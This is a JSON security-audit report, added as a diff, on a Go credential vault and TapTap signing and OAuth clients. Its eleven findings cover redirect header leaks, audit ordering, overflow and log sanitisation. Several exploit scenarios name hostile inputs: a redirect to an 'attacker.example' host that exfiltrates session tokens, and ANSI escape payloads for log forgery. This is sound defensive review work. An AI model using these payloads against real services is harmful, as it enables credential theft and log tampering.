@@ -1,0 +1,214 @@
+{
+  "scope": "S07",
+  "title": "Vault envelope crypto, signing, credentials (vault/*, tapsign/*, taptapoauth/*)",
+  "findings": [
+    {
+      "id": "S07-1",
+      "title": "Credential-bearing outbound requests rely entirely on the injected Doer for redirect policy; custom auth headers are copied to cross-host redirect targets by net/http",
+      "severity": "medium",
+      "category": "security",
+      "confidence": "high",
+      "locations": [
+        "tapsign/client.go:114",
+        "tapsign/client.go:115",
+        "tapsign/client.go:125",
+        "taptapoauth/client.go:195"
+      ],
+      "evidence": "tapsign/client.go:109-116\nfunc (c *client) newRequest(ctx context.Context, method, path string, body io.Reader) (*http.Request, error) {\n\treq, err := http.NewRequestWithContext(ctx, method, c.base+path, body)\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(\"tapsign: build request: %w\", err)\n\t}\n\treq.Header.Set(\"X-LC-Id\", c.appID)\n\treq.Header.Set(\"X-LC-Key\", c.appKey)\n\nand tapsign/client.go:124-126\n\tif session != \"\" {\n\t\treq.Header.Set(\"X-LC-Session\", session)\n\t}\n\nand taptapoauth/client.go:195-196\n\treq.Header.Set(\"Authorization\", authz)\n\treq.Header.Set(\"User-Agent\", tapUserAgent)",
+      "why": "The long-lived TapTap session token is sent as X-LC-Session and the app key as X-LC-Key, and taptapoauth sends the MAC Authorization header. When the Doer is an *http.Client whose CheckRedirect is nil (the stdlib default), the client follows redirects. net/http's shouldCopyHeaderOnRedirect only strips Authorization/Www-Authenticate/Cookie/Cookie2 when the destination is a different domain; every other header, including X-LC-Session and X-LC-Key, is copied to ANY redirect target, including a wholly different host. A compromised, misconfigured or DNS-hijacked upstream can therefore 302 the credential to an attacker host. The packages themselves never install a redirect policy: NewService/newClient accept an arbitrary httpclient.Doer and only validate it is non-nil (tapsign/service.go:52-62, taptapoauth/service.go:44-51).",
+      "exploit": "Operator wires tapsign.NewService(cfg, http.DefaultClient, logger) (or any client without CheckRedirect). Upstream /users/me or /users/.../refreshSessionToken returns 302 Location: https://attacker.example/collect. The Go client follows the hop and re-sends X-LC-Session: <session token> and X-LC-Key, exfiltrating the credential the vault exists to protect. For taptapoauth a same-registrable-domain sibling hop keeps Authorization as well.",
+      "recommendation": "Either reject any Doer that does not refuse cross-host redirects, or wrap the Doer inside these packages with a client whose CheckRedirect is httpclient.NoCrossHostRedirects (Define a wrapper Doer that clones the request and refuses scheme/host changes) so the guarantee does not depend on every caller. At minimum document the requirement on NewService and assert it in cmd wiring.",
+      "already_mitigated": false
+    },
+    {
+      "id": "S07-2",
+      "title": "vault.Enroll persists the credential before writing its audit event, so an audit failure returns an error for a write that already happened and leaves an un-audited (and in federation, orphaned) secret",
+      "severity": "medium",
+      "category": "reliability",
+      "confidence": "high",
+      "locations": [
+        "vault/service.go:245",
+        "vault/service.go:259"
+      ],
+      "evidence": "vault/service.go:245-267\n\tif err := s.repo.Put(ctx, Record{\n\t\tIdentity:   id,\n\t\tVersion:    recordVersion,\n\t\tWrappedDEK: wrapped,\n\t\tKEKID:      s.current.KeyID(),\n\t\tNonce:      nonce,\n\t\tCiphertext: ct,\n\t\tMeta:       cloneMeta(meta),\n\t\tCreatedAt:  now,\n\t\tUpdatedAt:  now,\n\t}); err != nil {\n\t\ts.observe(metricOpEnroll, metricRepoError, start)\n\t\treturn fmt.Errorf(\"vault: persist credential: %w\", err)\n\t}\n\tif err := s.record(ctx, audit.Event{\n\t\tAction:   \"vault.enroll\",\n\t\tSubject:  id.Subject,\n\t\tProvider: id.Provider,\n\t\tOutcome:  audit.OutcomeOK,\n\t}); err != nil {\n\t\ts.observe(metricOpEnroll, metricAuditError, start)\n\t\treturn err\n\t}",
+      "why": "Unlike Use (which fails closed before handing over the plaintext, service.go:334-339), Enroll writes the encrypted credential first and audits second. If the audit sink fails the caller is told the enrollment failed while the credential is stored and unaudited; no rollback is attempted. The in-repo caller internal/federation/bind.go:192-197 returns on the storeBindingSecret error without revoking, and its own comment (bind.go:199-203) calls a secret with no row pointing at it a defect 'only an account erasure would clear'.",
+      "exploit": "Audit sink is unavailable or its drain budget expires (see internal/store/postgres/auditbatch.go errAuditDrainExpired/errAuditClosed). A user completes an upstream OAuth bind: federation.storeBindingSecret -> vault.Enroll stores the encrypted access+refresh token, the audit write fails, Enroll returns error, CompleteBind aborts before bindings.Put. The upstream token stays decryptable in the vault with no binding row, unreachable by any endpoint and absent from the audit trail. Repeated during an outage, secrets accumulate invisibly.",
+      "recommendation": "Order Enroll like Use: either audit before persisting (fail closed), or on audit failure attempt repo.Delete/Revoke for the just-written record and report the rollback outcome (errors.Join) instead of returning a bare audit error. Document the chosen order.",
+      "already_mitigated": false
+    },
+    {
+      "id": "S07-3",
+      "title": "MemoryRepo.ListPage reloads clones and re-sorts the entire store on every page, making a rotation O(N^2 log N) with N clones per page",
+      "severity": "low",
+      "category": "performance",
+      "confidence": "high",
+      "locations": [
+        "vault/repo.go:229",
+        "vault/repo.go:233"
+      ],
+      "evidence": "vault/repo.go:229-248\nfunc (r *MemoryRepo) ListPage(_ context.Context, afterSubject, afterProvider string, limit int) ([]Record, error) {\n\tif limit <= 0 {\n\t\tlimit = 1\n\t}\n\tall, err := r.List(context.Background())\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tout := make([]Record, 0, limit)\n\tfor _, rec := range all {\n\t\tif !recordAfter(rec.Identity, afterSubject, afterProvider) {\n\t\t\tcontinue\n\t\t}\n\t\tout = append(out, rec)\n\t\tif len(out) == limit {\n\t\t\tbreak\n\t\t}\n\t}",
+      "why": "List (repo.go:202-217) materialises and deep-clones (cloneRecord: WrappedDEK, Nonce, Ciphertext, Meta) every record and sorts them; ListPage calls it once per page. Rotate uses pages of rotatePageSize=200 (rotate.go:45, :96), so for N records the rotation does ceil(N/200) full passes: O(N^2/200) clones and O(N^2 log N /200) comparison work, holding an RLock and allocating the whole store each pass. The memory driver is a supported deployment (cmd/re0auth config accepts storage.driver \"memory\" and main.go:897 wires vault.NewMemoryRepo), not only a test fixture.",
+      "exploit": "An operator runs -rotate-keys against a memory-backed deployment holding many credentials. Each page clones the full ciphertext set; with 50k records and ~1 KB payloads this is hundreds of full-store copies (tens of GB of allocation churn) and a CPU-bound stall, versus a single ordered walk.",
+      "recommendation": "Have MemoryRepo keep a sorted index or implement ListPage by iterating the map once and selecting the limit smallest records after the cursor, or document that rotation is unsupported for the memory driver. At minimum pass the caller's ctx instead of context.Background().",
+      "already_mitigated": false
+    },
+    {
+      "id": "S07-4",
+      "title": "Use builds the AEAD AAD from the requested identity while Rotate builds it from the stored record identity",
+      "severity": "low",
+      "category": "correctness",
+      "confidence": "high",
+      "locations": [
+        "vault/service.go:300",
+        "vault/rotate.go:104"
+      ],
+      "evidence": "vault/service.go:300\n\taad := bindingAAD(rec.Version, id.Subject, id.Provider)\n\nvault/rotate.go:104\n\t\taad := bindingAAD(rec.Version, rec.Identity.Subject, rec.Identity.Provider)",
+      "why": "Enroll seals under the identity it was given (service.go:224), so the ciphertext is bound to that (subject, provider). Rotation reconstructs the AAD from rec.Identity, Use from the caller's id. For the in-repo repos Get is keyed by id, so they coincide today; but any third-party Repo (the Repo interface is explicitly extended by third parties, repo.go:83-129) that returns a record whose Identity differs from the requested id makes Use derive an AAD that does not match the one the record was sealed under while Rotate derives the one that does. The two paths then disagree about whether the record is readable.",
+      "exploit": "A Repo implementation returns a sibling record (e.g. due to a key-collation or mapping bug). Use computes the request identity's AAD, GCM authentication fails, and the error is reported as 'unwrap DEK' / 'decrypt credential' rather than as an identity mismatch; rotation on the same record succeeds, so the operator gets contradictory signals.",
+      "recommendation": "Use rec.Identity consistently, and reject (or at least log) a returned Record whose Identity does not equal the requested id: if rec.Identity != id { return an error }.",
+      "already_mitigated": false
+    },
+    {
+      "id": "S07-5",
+      "title": "taptapoauth accepts upstream-controlled interval and expires_in without an upper bound or overflow guard",
+      "severity": "low",
+      "category": "reliability",
+      "confidence": "high",
+      "locations": [
+        "taptapoauth/client.go:96",
+        "taptapoauth/client.go:100"
+      ],
+      "evidence": "taptapoauth/client.go:96-103\n\tinterval := time.Duration(data.Interval) * time.Second\n\tif interval <= 0 {\n\t\tinterval = 5 * time.Second\n\t}\n\texpires := time.Duration(data.ExpiresIn) * time.Second\n\tif expires <= 0 {\n\t\texpires = 5 * time.Minute\n\t}",
+      "why": "data.Interval and data.ExpiresIn are int64 JSON fields from the untrusted upstream response. Multiplying by time.Second (1e9) can overflow int64: some values wrap negative (silently replaced by the defaults, which is harmless for interval but not for the caller's intent), while values just under the wrap point produce astronomically large positive durations. DeviceAuth.Interval is used by referencesource/taptap.go:160 to schedule the next poll and to answer RetryAfterSeconds, and ExpiresAt gates attempt expiry. A hostile or buggy peer can therefore set Interval to ~9.2e9 s (292 years) so the client never polls again, or ExpiresIn enormous so a live attempt and its upstream polling never expire.",
+      "exploit": "A compromised/misbehaving token endpoint returns {\"interval\":9223372036,\"expires_in\":9223372036}. Start succeeds; DeviceAuth.Interval is ~9.2e9 seconds, so the frontend/back-end never polls within the login's lifetime and the user's device approval cannot complete, or the attempt is retained and re-polled for the process lifetime.",
+      "recommendation": "Clamp both to protocol-sane ranges (e.g. interval min 1s / max 60s, expires_in min 1s / max 30min) after computing them, and guard the multiplication against overflow before converting.",
+      "already_mitigated": false
+    },
+    {
+      "id": "S07-6",
+      "title": "tapsign.Verify performs a credential-bearing upstream call with no audit record",
+      "severity": "low",
+      "category": "security",
+      "confidence": "high",
+      "locations": [
+        "tapsign/client.go:44",
+        "tapsign/client.go:40"
+      ],
+      "evidence": "tapsign/client.go:40-58\nfunc (c *client) Verify(ctx context.Context, cred Credential) error {\n\tif err := cred.Valid(); err != nil {\n\t\treturn err\n\t}\n\tresp, err := c.do(ctx, http.MethodGet, \"/users/me\", cred.SessionToken)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer drain(resp)\n\n\tswitch resp.StatusCode {\n\tcase http.StatusOK:\n\t\treturn nil",
+      "why": "Verify sends the decrypted session token to the upstream host (a cross-boundary operation with a credential) but, unlike Rotate/Revoke/Redeem, never calls c.finish/audit.Record. The package's own I3 rationale (audit the use of a credential before/at the boundary) is not applied to the one method that exercises the credential against the network. Verify is exported on the Service interface (tapsign/service.go:31-34).",
+      "exploit": "An operator or a future caller verifies a stored credential to probe source health. The external credential use leaves no audit trail, so a credential-exposure investigation cannot reconstruct which session tokens were exercised and when.",
+      "recommendation": "Record a tapsign.verify event with the outcome (ok / denied for 401/403 / error) via the same finish() path used by Rotate and Revoke.",
+      "already_mitigated": false
+    },
+    {
+      "id": "S07-7",
+      "title": "taptapoauth bounds upstream error text for logs but only strips CR/LF, leaving other control characters",
+      "severity": "low",
+      "category": "security",
+      "confidence": "medium",
+      "locations": [
+        "taptapoauth/client.go:337",
+        "taptapoauth/client.go:338"
+      ],
+      "evidence": "taptapoauth/client.go:337-343\nfunc boundDetail(s string) string {\n\ts = strings.TrimSpace(strings.NewReplacer(\"\\r\", \" \", \"\\n\", \" \").Replace(s))\n\tif r := []rune(s); len(r) > maxErrorDetail {\n\t\ts = string(r[:maxErrorDetail]) + \"\\u2026\"\n\t}\n\treturn s\n}",
+      "why": "The comments (client.go:330-335) state the intent is to stop a hostile upstream from forging a log entry. Replacing only \\r and \\n leaves ANSI/terminal escape sequences (ESC, e.g. \\x1b[2J), NUL and other C0 control characters intact in the string that businessError/tokenBusinessError embed into the error, which is then logged by operators and returned to callers (referencesource/cascade style handlers log err.Error()). This allows terminal-escape/log-forgery against a log viewer rather than newline-based record injection.",
+      "exploit": "The configured token/user-info endpoint (or DNS/TLS attacker) answers env.Success=false with data.err = \"\\u001b[2J\\u001b[31mFATAL: audit disabled\". The error string returned and slogged contains raw escape bytes, manipulating an operator's terminal while reading logs.",
+      "recommendation": "Strip or escape all non-printable characters (e.g. keep only unicode.IsPrint runes, replacing others) in boundDetail rather than only CR/LF.",
+      "already_mitigated": false
+    },
+    {
+      "id": "S07-8",
+      "title": "tapsign.drain and the response handling dereference resp and resp.Body without a nil check",
+      "severity": "low",
+      "category": "reliability",
+      "confidence": "medium",
+      "locations": [
+        "tapsign/client.go:224",
+        "tapsign/client.go:48"
+      ],
+      "evidence": "tapsign/client.go:224-227\nfunc drain(resp *http.Response) {\n\t_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, maxBody))\n\t_ = resp.Body.Close()\n}",
+      "why": "httpclient.drain (httpclient/retry.go:195-201) guards resp == nil and resp.Body == nil; this copy does not. Every tapsign path does `resp, err := c.do(...)`, returns on err != nil, and then calls drain(resp) or immediately reads resp.StatusCode (client.go:48, :88, :178). A Doer that returns (nil, nil) or a response with a nil Body (permitted by a bespoke Doer/RoundTripper, which is exactly the seam these packages are built around) panics inside the server instead of returning an error. taptapoauth/client.go:202 and :239 have the same unguarded `resp.Body.Close()`.",
+      "exploit": "A deployment injects a custom Doer (or middleware) that returns a nil response or a response without Body for a short-circuited request. The first tapping call panics the HTTP handler goroutine; depending on recovery middleware this becomes a 500 or crashes the process.",
+      "recommendation": "Mirror httpclient.drain's nil guards: if resp == nil || resp.Body == nil { return } and check resp != nil before reading StatusCode.",
+      "already_mitigated": false
+    },
+    {
+      "id": "S07-9",
+      "title": "Re-enrolling a credential overwrites CreatedAt, discarding the original creation time",
+      "severity": "low",
+      "category": "correctness",
+      "confidence": "high",
+      "locations": [
+        "vault/service.go:244",
+        "vault/service.go:253"
+      ],
+      "evidence": "vault/service.go:244-254\n\tnow := time.Now().UTC()\n\tif err := s.repo.Put(ctx, Record{\n\t\tIdentity:   id,\n\t\tVersion:    recordVersion,\n\t\tWrappedDEK: wrapped,\n\t\tKEKID:      s.current.KeyID(),\n\t\tNonce:      nonce,\n\t\tCiphertext: ct,\n\t\tMeta:       cloneMeta(meta),\n\t\tCreatedAt:  now,\n\t\tUpdatedAt:  now,\n\t})",
+      "why": "Enroll is documented as 'stores, or replaces' (service.go:19-20) and Repo.Put replaces wholesale; the Postgres adapter maps created_at = EXCLUDED.created_at (internal/store/postgres/vault.go:112-120). A re-bind/refresh that re-enrolls the same identity resets CreatedAt to the re-enrollment time, so 'when was this account first linked / when did this secret first exist' cannot be recovered from the record. This is relied on by operator/account views and by any forensic timeline.",
+      "exploit": "A user disconnects and reconnects a source, or a binding refresh re-enrolls; the vault record now claims the credential was created today. Auditing an incident, an operator cannot distinguish a long-lived credential from one created moments ago.",
+      "recommendation": "Preserve an existing CreatedAt on replace (read-then-write is racy; add a CreatedAt-preserving Put variant or a dedicated column update), or document that CreatedAt means 'last write' and add a separate immutable first_seen.",
+      "already_mitigated": false
+    },
+    {
+      "id": "S07-10",
+      "title": "tapsign.Rotate returns the replacement token together with an audit error, inviting callers to discard a token that is now the only live credential",
+      "severity": "low",
+      "category": "reliability",
+      "confidence": "medium",
+      "locations": [
+        "tapsign/client.go:60",
+        "tapsign/client.go:197"
+      ],
+      "evidence": "tapsign/client.go:60-63\nfunc (c *client) Rotate(ctx context.Context, cred Credential) (Credential, error) {\n\tnext, err := c.rotate(ctx, cred)\n\treturn next, c.finish(ctx, \"tapsign.rotate\", cred, err)\n}\n\nand client.go:197-211\nfunc (c *client) finish(ctx context.Context, action string, cred Credential, opErr error) error {\n\tif err := c.audit.Record(ctx, audit.Event{\n\t\tAction:   action,\n\t\tSubject:  cred.ObjectID,\n\t\tProvider: \"taptap\",\n\t\tOutcome:  outcomeOf(opErr),\n\t}); err != nil {\n\t\taerr := fmt.Errorf(\"tapsign: audit: %w\", err)\n\t\tif opErr != nil {\n\t\t\treturn errors.Join(opErr, aerr)\n\t\t}\n\t\treturn aerr\n\t}\n\treturn opErr\n}",
+      "why": "rotate() has already invalidated the old session token upstream and returned the replacement. If the audit record then fails, finish() returns a non-nil error, but Rotate still returns `next` alongside it. The natural caller pattern `next, err := Rotate(...); if err != nil { return err }` drops `next`; the old token is dead everywhere and the replacement was never persisted, so the user is permanently logged out and a retry with the old credential returns 401 (ErrInvalidCredential) and cannot converge. (Revoke has the mirror-image and safer shape: it discards the replacement and converts 401 to success.)",
+      "exploit": "Audit backend briefly unavailable during a rotation triggered by the source. Rotate returns (newToken, auditError); the caller treats the error as 'rotation failed' and never stores newToken. The client is left with the invalidated old token and the user must re-authorize.",
+      "recommendation": "Give the caller an unambiguous signal: return the replacement with a null error and surface the audit failure out of band, or return the replacement inside a typed partial-success error and document that the caller must persist it before returning. At minimum document that err != nil does not mean the rotation did not happen.",
+      "already_mitigated": false
+    },
+    {
+      "id": "S07-11",
+      "title": "bindingAAD truncates identity lengths to uint32 before length-prefixing",
+      "severity": "info",
+      "category": "security",
+      "confidence": "high",
+      "locations": [
+        "vault/envelope.go:148",
+        "vault/envelope.go:150"
+      ],
+      "evidence": "vault/envelope.go:141-153\nfunc bindingAAD(version byte, subject, provider string) []byte {\n\tb := make([]byte, 0, 1+4+len(subject)+4+len(provider))\n\tb = append(b, version)\n\t// The prefix is uint32 by the AAD's own layout. A credential subject or\n\t// provider is a bounded identity string, so the truncation G115 warns about\n\t// is not reachable, and this AAD builder has no error return to carry a\n\t// length check (G115).\n\tb = binary.BigEndian.AppendUint32(b, uint32(len(subject))) //nolint:gosec // G115: 4 GiB identity is not a stored shape\n\tb = append(b, subject...)\n\tb = binary.BigEndian.AppendUint32(b, uint32(len(provider))) //nolint:gosec // G115: 4 GiB identity is not a stored shape\n\tb = append(b, provider...)\n\treturn b\n}",
+      "why": "If either field ever exceeded 4 GiB the truncated prefix would make distinct identities share an AAD, defeating the anti-swap binding. In practice subject is a usr_/openid identifier and provider is game+\".\"+source, both far below the bound; the concern is explicitly documented and the AAD layout is otherwise unambiguous.",
+      "exploit": "No practical trigger: constructing a 4 GiB subject/provider is not a stored shape and would exhaust memory first.",
+      "recommendation": "No change required. If the AAD builder ever gains an error return, reject len > math.MaxUint32 defensively.",
+      "already_mitigated": true
+    }
+  ],
+  "coverage": [
+    "vault/envelope.go",
+    "vault/repo.go",
+    "vault/rotate.go",
+    "vault/scrub.go",
+    "vault/service.go",
+    "tapsign/client.go",
+    "tapsign/config.go",
+    "tapsign/credential.go",
+    "tapsign/service.go",
+    "taptapoauth/client.go",
+    "taptapoauth/config.go",
+    "taptapoauth/service.go",
+    "httpclient/httpclient.go",
+    "httpclient/outbound.go",
+    "httpclient/retry.go",
+    "httpclient/circuitbreaker.go",
+    "audit/audit.go",
+    "internal/store/postgres/vault.go",
+    "internal/store/postgres/auditbatch.go",
+    "internal/federation/binding.go",
+    "internal/federation/bind.go",
+    "internal/federation/refresh.go",
+    "referencesource/taptap.go",
+    "referencesource/cascade.go",
+    "cmd/re0auth/config.go (KEK decode/paths)",
+    "cmd/re0auth/main.go (openVault/rotateAndReport)",
+    "cmd/referencesource/main.go (TapTap wiring)"
+  ],
+  "notes": "Round 9, independent: no AUDIT-ISSUES.md / docs/security-audit-* / internal/zzprobe / _audit / scratchpad content was used as a source. All 12 production files in the primary scope were read in full; cross-package files listed in coverage were read to follow untrusted input to sinks. No critical or high-severity defect was found in this scope: the envelope construction (AES-256-GCM with per-record random nonces, length-prefixed identity AAD, separate KEK/DEK keys), the fail-closed audit-before-use ordering in Use, the CAS RewrapIfUnchanged rotation, and the retired-key material/fingerprint checks are sound as written. S07-1 (redirect header handling) is mitigated in-repo by the only caller, cmd/referencesource/main.go:163-166 which wires httpclient.NoCrossHostRedirects; it is reported because NewService/newClient accept any non-nil Doer and enforce nothing themselves. Unverified edges: (a) referencesource.TapTapLogin.attempts (referencesource/taptap.go:100,124-127) is an in-memory map swept only on begin, so unauthenticated /login/taptap/challenge traffic can grow it and drive upstream device-code calls within the 5-minute TTL -- out of the S07 primary scope, noted for whoever owns referencesource; (b) whether the stdlib still copies X-LC-* headers on cross-host redirects was reasoned from net/http's documented shouldCopyHeaderOnRedirect semantics rather than executed; (c) taptapoauth's MAC-SHA1 signature layout was checked against its own documented comment and matches, but TapTap's canonical spec was not fetched. No Docker/Postgres was used; dynamic verification was limited to `go build ./vault/... ./tapsign/... ./taptapoauth/...` (clean, go1.27.1)."
+}
